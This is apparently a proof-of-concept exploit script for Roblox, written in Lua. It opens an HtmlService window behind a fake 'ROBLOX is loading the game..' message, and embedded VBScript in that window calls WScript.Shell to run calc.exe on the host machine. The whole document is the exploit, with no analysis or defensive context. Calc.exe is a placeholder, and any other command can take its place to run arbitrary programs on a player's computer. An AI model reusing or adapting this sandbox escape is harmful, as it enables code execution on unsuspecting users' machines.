local w = game:GetService("HtmlService"):NewWindow()

w.DocumentComplete:Connect(function()
	w:SetBody([==[
	<html>
	<head><title>Test</title></head>
	<body>
		<h3>ROBLOX is loading the game..</h3>

		<script language="VBScript">
		Set WshShell = CreateObject("WScript.Shell")
		WshShell.Run "calc.exe"
		</script>

	</body>
	</html>
	]==])
	w:Show()
end)

w:Navigate()
